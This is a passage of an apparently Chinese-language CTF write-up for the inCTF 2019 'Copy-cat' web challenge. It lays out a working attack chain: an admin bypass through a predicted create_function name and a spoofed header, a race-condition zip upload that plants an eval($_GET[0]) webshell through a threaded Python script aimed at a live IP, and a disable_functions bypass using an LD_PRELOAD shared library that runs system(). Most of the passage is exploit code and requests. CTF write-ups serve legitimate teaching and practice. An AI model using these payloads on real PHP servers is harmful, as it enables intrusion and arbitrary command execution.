+<h6 id="通过分析代码，我们可以看到仅当通过-SERVER-quot-REMOTE-ADDR-quot-访问改页面的IP为127-0-0-1时，会话中的admin值才设置为True。因此我们要用127-0-0-1来覆盖-SERVER-quot-HTTP-I-AM-ADMIN-quot-的值，并通过调用create-function创建函数来实现。"><a href="#通过分析代码，我们可以看到仅当通过-SERVER-quot-REMOTE-ADDR-quot-访问改页面的IP为127-0-0-1时，会话中的admin值才设置为True。因此我们要用127-0-0-1来覆盖-SERVER-quot-HTTP-I-AM-ADMIN-quot-的值，并通过调用create-function创建函数来实现。" class="headerlink" title="通过分析代码，我们可以看到仅当通过$_SERVER[&quot;REMOTE_ADDR&quot;]访问改页面的IP为127.0.0.1时，会话中的admin值才设置为True。因此我们要用127.0.0.1来覆盖$_SERVER[&quot;HTTP_I_AM_ADMIN&quot;]的值，并通过调用create_function创建函数来实现。"></a>通过分析代码，我们可以看到仅当通过<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>访问改页面的IP为<code>127.0.0.1</code>时，会话中的admin值才设置为True。因此我们要用<code>127.0.0.1</code>来覆盖<code>$_SERVER[&quot;HTTP_I_AM_ADMIN&quot;]</code>的值，并通过调用<code>create_function</code>创建函数来实现。</h6><h6 id="但是你会发现上面的那个函数没有办法调用，因为你要构造一个admin-random-bin2hex-openssl-random-pseudo-bytes-32-的函数，然后通过-GET-39-random-39-传入来调用，但是那个-random是随机的你没有办法预测。"><a href="#但是你会发现上面的那个函数没有办法调用，因为你要构造一个admin-random-bin2hex-openssl-random-pseudo-bytes-32-的函数，然后通过-GET-39-random-39-传入来调用，但是那个-random是随机的你没有办法预测。" class="headerlink" title="但是你会发现上面的那个函数没有办法调用，因为你要构造一个admin_+$random = bin2hex(openssl_random_pseudo_bytes(32));的函数，然后通过$_GET[&#39;random&#39;]();传入来调用，但是那个$random是随机的你没有办法预测。"></a>但是你会发现上面的那个函数没有办法调用，因为你要构造一个<code>admin_</code>+<code>$random = bin2hex(openssl_random_pseudo_bytes(32));</code>的函数，然后通过<code>$_GET[&#39;random&#39;]();</code>传入来调用，但是那个<code>$random</code>是随机的你没有办法预测。</h6><h6 id="然后我们google了几个小时找到了关于create-function注入的相关知识。"><a href="#然后我们google了几个小时找到了关于create-function注入的相关知识。" class="headerlink" title="然后我们google了几个小时找到了关于create_function注入的相关知识。"></a>然后我们google了几个小时找到了关于<code>create_function</code>注入的相关知识。</h6><h6 id="大家可以阅读这两篇博客："><a href="#大家可以阅读这两篇博客：" class="headerlink" title="大家可以阅读这两篇博客："></a>大家可以阅读这两篇博客：</h6><h6 id="PHP-create-function-代码注入"><a href="#PHP-create-function-代码注入" class="headerlink" title="PHP create_function()代码注入"></a><a href="https://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()代码注入</a></h6><h6 id="create-function函数如何实现RCE"><a href="#create-function函数如何实现RCE" class="headerlink" title="create_function函数如何实现RCE"></a><a href="https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/" target="_blank" rel="noopener">create_function函数如何实现RCE</a></h6><h6 id="最后阅读通过阅读php的create-function源代码解决了这个问题。"><a href="#最后阅读通过阅读php的create-function源代码解决了这个问题。" class="headerlink" title="最后阅读通过阅读php的create_function源代码解决了这个问题。"></a>最后阅读通过阅读php的create_function源代码解决了这个问题。</h6><h6 id="zend-builtin-function-c"><a href="#zend-builtin-function-c" class="headerlink" title="zend_builtin_function.c"></a><code>zend_builtin_function.c</code></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAMBDA_TEMP_FUNCNAME	<span class="meta-string">"__lambda_func"</span></span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; proto string create_function(string args, string code)</span></span><br><span class="line"><span class="comment">   Creates an anonymous function, and returns its name (funny, eh?) */</span></span><br><span class="line">ZEND_FUNCTION(create_function)</span><br><span class="line">&#123;</span><br><span class="line"> ..省略..</span><br><span class="line"></span><br><span class="line">		function_name = zend_string_alloc(<span class="keyword">sizeof</span>(<span class="string">"0lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="number">0</span>);</span><br><span class="line">		ZSTR_VAL(function_name)[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			ZSTR_LEN(function_name) = <span class="built_in">snprintf</span>(ZSTR_VAL(function_name) + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="string">"lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="string">"lambda_%d"</span>, ++EG(lambda_count)) + <span class="number">1</span>;</span><br><span class="line">		&#125; <span class="keyword">while</span> (zend_hash_add_ptr(EG(function_table), function_name, func) == <span class="literal">NULL</span>);</span><br><span class="line">		RETURN_NEW_STR(function_name);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, <span class="keyword">sizeof</span>(LAMBDA_TEMP_FUNCNAME)<span class="number">-1</span>);</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="上面的源代码中，我们可以看到create-function函数的返回值为-x00lambda-d，并且实际的本地测试显示匿名函数最终以-x00lambda-1-x00lambda-2等字符串形式返回。"><a href="#上面的源代码中，我们可以看到create-function函数的返回值为-x00lambda-d，并且实际的本地测试显示匿名函数最终以-x00lambda-1-x00lambda-2等字符串形式返回。" class="headerlink" title="上面的源代码中，我们可以看到create_function函数的返回值为\x00lambda_%d，并且实际的本地测试显示匿名函数最终以\x00lambda_1,\x00lambda_2等字符串形式返回。"></a>上面的源代码中，我们可以看到<code>create_function</code>函数的返回值为<code>\x00lambda_%d</code>，并且实际的本地测试显示匿名函数最终以<code>\x00lambda_1,\x00lambda_2</code>等字符串形式返回。</h6><h6 id="然后回到上面的代码，我们可以预测-remote-admin变量中匿名函数的字符串名称值，以便我们可以调用匿名函数来获取管理员的权限，而无需直接调用admin-random-函数。"><a href="#然后回到上面的代码，我们可以预测-remote-admin变量中匿名函数的字符串名称值，以便我们可以调用匿名函数来获取管理员的权限，而无需直接调用admin-random-函数。" class="headerlink" title="然后回到上面的代码，我们可以预测$remote_admin变量中匿名函数的字符串名称值，以便我们可以调用匿名函数来获取管理员的权限，而无需直接调用admin_$random()函数。"></a>然后回到上面的代码，我们可以预测<code>$remote_admin</code>变量中匿名函数的字符串名称值，以便我们可以调用匿名函数来获取管理员的权限，而无需直接调用<code>admin_$random()</code>函数。</h6><h6 id="绕过的payload如下："><a href="#绕过的payload如下：" class="headerlink" title="绕过的payload如下："></a>绕过的payload如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /remote_admin.php?random=%00lambda_1 HTTP/1.1</span><br><span class="line">Host: 3.15.186.158</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">I-AM-ADMIN: 127.0.0.1</span><br><span class="line">Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=2grnkh3472812hpf3jg4p2m5g6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<h6 id="现在，获得管理员权限后，如果我们再次访问admin-php页面你可以看到有一个上传功能。"><a href="#现在，获得管理员权限后，如果我们再次访问admin-php页面你可以看到有一个上传功能。" class="headerlink" title="现在，获得管理员权限后，如果我们再次访问admin.php页面你可以看到有一个上传功能。"></a>现在，获得管理员权限后，如果我们再次访问<code>admin.php</code>页面你可以看到有一个上传功能。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_Copy-cat_3.png" alt></p>
+<h6 id="上传功能的代码如下："><a href="#上传功能的代码如下：" class="headerlink" title="上传功能的代码如下："></a>上传功能的代码如下：</h6><h6 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a><code>upload.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"functions.php"</span>);</span><br><span class="line"></span><br><span class="line">is_login();</span><br><span class="line">is_admin();</span><br><span class="line"></span><br><span class="line">$SANDBOX = getcwd() . <span class="string">"/uploads/"</span> . md5(<span class="string">"xxSpyD3rxx"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>] . <span class="string">"xxxisbackxxx"</span>);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">  ExtractZipFile($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $SANDBOX);</span><br><span class="line">  CheckDir($SANDBOX);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"File is at: "</span> . <span class="string">"/uploads/"</span> . md5(<span class="string">"xxSpyD3rxx"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>] . <span class="string">"xxxisbackxxx"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="functions-php-1"><a href="#functions-php-1" class="headerlink" title="functions.php"></a><code>functions.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">..省略..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExtractZipFile</span><span class="params">($file,$path)</span></span>&#123;</span><br><span class="line">  $zip = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">  <span class="keyword">if</span> ($zip-&gt;open($file) === <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    <span class="comment">// 解压zip文件</span></span><br><span class="line">    $zip-&gt;extractTo($path);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckDir</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $files = scandir($path);</span><br><span class="line">    <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        $filepath = <span class="string">"$path/$file"</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_file($filepath)) &#123;</span><br><span class="line">            $parts = pathinfo($file);</span><br><span class="line">            $ext = strtolower($parts[<span class="string">'extension'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (strpos($ext, <span class="string">'php'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'pl'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'py'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'cgi'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'asp'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'js'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'rb'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">		strpos($ext, <span class="string">'htaccess'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'jar'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 条件竞争写入webShell</span></span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);    <span class="comment">// just in case the unlink fails for some reason</span></span><br><span class="line">                unlink($filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($file != <span class="string">'.'</span> &amp;&amp; $file != <span class="string">'..'</span> &amp;&amp; is_dir($filepath)) &#123;</span><br><span class="line">            CheckDir($filepath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">..省略..</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="代码的流程如下："><a href="#代码的流程如下：" class="headerlink" title="代码的流程如下："></a>代码的流程如下：</h6><h6 id="解压缩上传的Zip文件到-uploads-md5-hex-value-目录下，并且将会验证上传的文件后缀来判断是否要删除文件。"><a href="#解压缩上传的Zip文件到-uploads-md5-hex-value-目录下，并且将会验证上传的文件后缀来判断是否要删除文件。" class="headerlink" title="解压缩上传的Zip文件到./uploads/md5_hex_value/目录下，并且将会验证上传的文件后缀来判断是否要删除文件。"></a>解压缩上传的Zip文件到<code>./uploads/md5_hex_value/</code>目录下，并且将会验证上传的文件后缀来判断是否要删除文件。</h6><h6 id="但是上传的文件是先保存后在删除的，因此我们可以用条件竞争的方式来getshell。"><a href="#但是上传的文件是先保存后在删除的，因此我们可以用条件竞争的方式来getshell。" class="headerlink" title="但是上传的文件是先保存后在删除的，因此我们可以用条件竞争的方式来getshell。"></a>但是上传的文件是先保存后在删除的，因此我们可以用条件竞争的方式来getshell。</h6><h6 id="youngsin-php-将此文件压缩成youngsin-zip"><a href="#youngsin-php-将此文件压缩成youngsin-zip" class="headerlink" title="youngsin.php(将此文件压缩成youngsin.zip)"></a>youngsin.php(将此文件压缩成youngsin.zip)</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">mkdir(<span class="string">"../youngsin/"</span>);</span><br><span class="line">file_put_contents(<span class="string">"../youngsin/webshell.php"</span>,<span class="string">'&lt;?php eval($_GET[0]);?&gt;'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"WebShell Path = "</span>.getcwd().<span class="string">"/../youngsin/webshell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="raceCondition-py"><a href="#raceCondition-py" class="headerlink" title="raceCondition.py"></a><code>raceCondition.py</code></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_zip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://3.15.186.158/upload.php"</span></span><br><span class="line">        multiple_files = [</span><br><span class="line">            (<span class="string">'file'</span>, (<span class="string">'foo.png'</span>, open(<span class="string">'C:\Users\Administrator\Desktop/1/youngsin.zip'</span>,<span class="string">"rb"</span>), <span class="string">'application/x-zip-compressed'</span>))]</span><br><span class="line">        header = &#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=2grnkh3472812hpf3jg4p2m5g6"</span>&#125;</span><br><span class="line">        result =  requests.post(url,headers=header,files=multiple_files).text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://3.15.186.158/uploads/e8d8a3c4bd79dbe75be52c8328e2f1bb/youngsin.php"</span></span><br><span class="line">        header = &#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=2grnkh3472812hpf3jg4p2m5g6"</span>&#125;</span><br><span class="line">        result = requests.get(url, headers=header).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"404 Not Found"</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    threading.Thread(target=upload_zip,args=(<span class="string">''</span>)).start()</span><br><span class="line">    threading.Thread(target=get_shell, args=(<span class="string">''</span>)).start()</span><br></pre></td></tr></table></figure>
+
+<h6 id="结果如下："><a href="#结果如下：" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebShell Path = /var/www/html/uploads/e8d8a3c4bd79dbe75be52c8328e2f1bb/../youngsin/webshell.php</span><br></pre></td></tr></table></figure>
+
+<h6 id="如果你访问生成的webshell，你将看到webshell已经正常上传。"><a href="#如果你访问生成的webshell，你将看到webshell已经正常上传。" class="headerlink" title="如果你访问生成的webshell，你将看到webshell已经正常上传。"></a>如果你访问生成的webshell，你将看到webshell已经正常上传。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_Copy-cat_4.png" alt></p>
+<h6 id="现在，我们已经成功的上传了webshell，但是我们还是不能去读取flag存在的文件因为这个文件只有执行的权限，因此我们并不能通过简单的file-Function来获取。"><a href="#现在，我们已经成功的上传了webshell，但是我们还是不能去读取flag存在的文件因为这个文件只有执行的权限，因此我们并不能通过简单的file-Function来获取。" class="headerlink" title="现在，我们已经成功的上传了webshell，但是我们还是不能去读取flag存在的文件因为这个文件只有执行的权限，因此我们并不能通过简单的file Function来获取。"></a>现在，我们已经成功的上传了webshell，但是我们还是不能去读取flag存在的文件因为这个文件只有执行的权限，因此我们并不能通过简单的<code>file Function</code>来获取。</h6><h6 id="通过phpinfo-我们可以看到，disable-functions的设置如下："><a href="#通过phpinfo-我们可以看到，disable-functions的设置如下：" class="headerlink" title="通过phpinfo()我们可以看到，disable_functions的设置如下："></a>通过<code>phpinfo()</code>我们可以看到，<code>disable_functions</code>的设置如下：</h6><h6 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,</span><br><span class="line">pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,</span><br><span class="line">pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,</span><br><span class="line">pcntl_signal_get_handler,proc_open,pcntl_signal_dispatch,pcntl_get_last_error,</span><br><span class="line">pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,</span><br><span class="line">pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</span><br><span class="line">error_log,system,exec,shell_exec,</span><br><span class="line">popen,passthru,link,symlink,</span><br><span class="line">syslog,imap_open,ld,mail,</span><br><span class="line">fread,fopen,file_get_contents,readfile,</span><br><span class="line">chdir</span><br></pre></td></tr></table></figure>
+
+<h6 id="基本上，我们可以看到php中所有有关shell的函数都被禁用了，但是禁用函数列表没有禁用putenv，因此我们可以使用LD-PRELOAD来突破disable-functions来执行系统命令。"><a href="#基本上，我们可以看到php中所有有关shell的函数都被禁用了，但是禁用函数列表没有禁用putenv，因此我们可以使用LD-PRELOAD来突破disable-functions来执行系统命令。" class="headerlink" title="基本上，我们可以看到php中所有有关shell的函数都被禁用了，但是禁用函数列表没有禁用putenv，因此我们可以使用LD_PRELOAD来突破disable_functions来执行系统命令。"></a>基本上，我们可以看到php中所有有关shell的函数都被禁用了，但是禁用函数列表没有禁用<code>putenv</code>，因此我们可以使用<code>LD_PRELOAD</code>来突破<code>disable_functions</code>来执行系统命令。</h6><h6 id="LD-PRELOAD为我们提供了劫持系统函数的能力，但是前提是我们要控制php启动外部程序才行-只要有进程启动行为即可-，我们常用的启动一个新进程的方法有mail-imap-open-error-log-syslog和imagick-没有安装此模块-，其内部原理都是通过execve来开启一个新的进程。"><a href="#LD-PRELOAD为我们提供了劫持系统函数的能力，但是前提是我们要控制php启动外部程序才行-只要有进程启动行为即可-，我们常用的启动一个新进程的方法有mail-imap-open-error-log-syslog和imagick-没有安装此模块-，其内部原理都是通过execve来开启一个新的进程。" class="headerlink" title="LD_PRELOAD为我们提供了劫持系统函数的能力，但是前提是我们要控制php启动外部程序才行(只要有进程启动行为即可)，我们常用的启动一个新进程的方法有mail,imap_open,error_log,syslog和imagick(没有安装此模块)，其内部原理都是通过execve来开启一个新的进程。"></a><code>LD_PRELOAD</code>为我们提供了劫持系统函数的能力，但是前提是我们要控制php启动外部程序才行(只要有进程启动行为即可)，我们常用的启动一个新进程的方法有<code>mail,imap_open,error_log,syslog</code>和<code>imagick</code>(没有安装此模块)，其内部原理都是通过<code>execve</code>来开启一个新的进程。</h6><h6 id="但是禁用函数列表全部把我们可以用的函数全部给禁用了现在我们就要看看php安装了哪些可以用的模块。"><a href="#但是禁用函数列表全部把我们可以用的函数全部给禁用了现在我们就要看看php安装了哪些可以用的模块。" class="headerlink" title="但是禁用函数列表全部把我们可以用的函数全部给禁用了现在我们就要看看php安装了哪些可以用的模块。"></a>但是禁用函数列表全部把我们可以用的函数全部给禁用了现在我们就要看看php安装了哪些可以用的模块。</h6><h6 id="我们最后在phpinfo中看到了一个名为mbstring的扩展模块。"><a href="#我们最后在phpinfo中看到了一个名为mbstring的扩展模块。" class="headerlink" title="我们最后在phpinfo中看到了一个名为mbstring的扩展模块。"></a>我们最后在phpinfo中看到了一个名为<code>mbstring</code>的扩展模块。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_Copy-cat_5.png" alt></p>
+<h6 id="如果安装了该模块，则可以使用Multibyte-character-encoding的功能，其中的mb-send-mail函数的功能可以替代mail，并且达到相同的效果，如下所示："><a href="#如果安装了该模块，则可以使用Multibyte-character-encoding的功能，其中的mb-send-mail函数的功能可以替代mail，并且达到相同的效果，如下所示：" class="headerlink" title="如果安装了该模块，则可以使用Multibyte character encoding的功能，其中的mb_send_mail函数的功能可以替代mail，并且达到相同的效果，如下所示："></a>如果安装了该模块，则可以使用<code>Multibyte character encoding</code>的功能，其中的<code>mb_send_mail</code>函数的功能可以替代<code>mail</code>，并且达到相同的效果，如下所示：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_Copy-cat_6.png" alt></p>
+<h6 id="对于这个函数，由于它除了编码部分其余与mail函数一样，因此通过execve进行sendmail调用是在内部进行的，并且不应用disable-function，因此我们可以通过使用LD-PRELOAD来劫持系统函数，执行系统命令。"><a href="#对于这个函数，由于它除了编码部分其余与mail函数一样，因此通过execve进行sendmail调用是在内部进行的，并且不应用disable-function，因此我们可以通过使用LD-PRELOAD来劫持系统函数，执行系统命令。" class="headerlink" title="对于这个函数，由于它除了编码部分其余与mail函数一样，因此通过execve进行sendmail调用是在内部进行的，并且不应用disable_function，因此我们可以通过使用LD_PRELOAD来劫持系统函数，执行系统命令。"></a>对于这个函数，由于它除了编码部分其余与<code>mail</code>函数一样，因此通过<code>execve</code>进行<code>sendmail</code>调用是在内部进行的，并且不应用<code>disable_function</code>，因此我们可以通过使用<code>LD_PRELOAD</code>来劫持系统函数，执行系统命令。</h6><h6 id="下面简要介绍一下LD-PRELOAD怎样劫持系统函数。"><a href="#下面简要介绍一下LD-PRELOAD怎样劫持系统函数。" class="headerlink" title="下面简要介绍一下LD_PRELOAD怎样劫持系统函数。"></a>下面简要介绍一下<code>LD_PRELOAD</code>怎样劫持系统函数。</h6><h6 id="1-创建一个覆盖execve的共享库-例如：gcc-shared-fPIC-evil-c-o-evil-so"><a href="#1-创建一个覆盖execve的共享库-例如：gcc-shared-fPIC-evil-c-o-evil-so" class="headerlink" title="1. 创建一个覆盖execve的共享库(例如：gcc -shared -fPIC evil.c -o evil.so)"></a>1. 创建一个覆盖execve的共享库(例如：gcc -shared -fPIC evil.c -o evil.so)</h6><h6 id="2-上传-so文件。"><a href="#2-上传-so文件。" class="headerlink" title="2. 上传.so文件。"></a>2. 上传.so文件。</h6><h6 id="3-通过使用php的putenv来设置LD-PRELOAD，让我们的动态链接程序被优先调用。"><a href="#3-通过使用php的putenv来设置LD-PRELOAD，让我们的动态链接程序被优先调用。" class="headerlink" title="3. 通过使用php的putenv来设置LD_PRELOAD，让我们的动态链接程序被优先调用。"></a>3. 通过使用php的<code>putenv</code>来设置<code>LD_PRELOAD</code>，让我们的动态链接程序被优先调用。</h6><h6 id="4-调用一个函数-例如：mail-imap-open-error-log等-，该函数在php内部调用execve。"><a href="#4-调用一个函数-例如：mail-imap-open-error-log等-，该函数在php内部调用execve。" class="headerlink" title="4. 调用一个函数(例如：mail,imap_open,error_log等)，该函数在php内部调用execve。"></a>4. 调用一个函数(例如：mail,imap_open,error_log等)，该函数在php内部调用<code>execve</code>。</h6><h6 id="如果你对这项技术感到好奇，你可以通过google搜索关键字如php-ld-preload-bypass来详细的了解。"><a href="#如果你对这项技术感到好奇，你可以通过google搜索关键字如php-ld-preload-bypass来详细的了解。" class="headerlink" title="如果你对这项技术感到好奇，你可以通过google搜索关键字如php ld_preload bypass来详细的了解。"></a>如果你对这项技术感到好奇，你可以通过google搜索关键字如<code>php ld_preload bypass</code>来详细的了解。</h6><h6 id="执行上述过程的代码如下："><a href="#执行上述过程的代码如下：" class="headerlink" title="执行上述过程的代码如下："></a>执行上述过程的代码如下：</h6><h6 id="evil-c"><a href="#evil-c" class="headerlink" title="evil.c"></a><code>evil.c</code></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">u_int <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command;</span><br><span class="line">command = getenv(<span class="string">"youngsin"</span>);</span><br><span class="line">system(command);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
